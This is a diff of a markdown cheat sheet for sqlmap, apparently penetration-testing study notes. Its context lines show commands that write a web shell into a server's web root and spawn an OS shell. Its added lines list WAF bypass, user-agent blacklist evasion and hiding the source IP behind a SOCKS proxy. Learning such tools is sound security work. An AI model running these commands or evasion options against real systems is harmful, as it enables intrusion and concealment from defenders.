@@ -26,6 +26,9 @@
 | `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                              |
 | `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell                                        |
 | `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch` | Unique Value Bypass |
+| --random-agent | User-agent Blacklisting Bypass |
+| --skip-waf | WAF Bypass |
+| e.g. --proxy="socks4://177.39.187.70:33283" | IP Address Concealing |
 
 > similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as `'/?id=*'`.
 
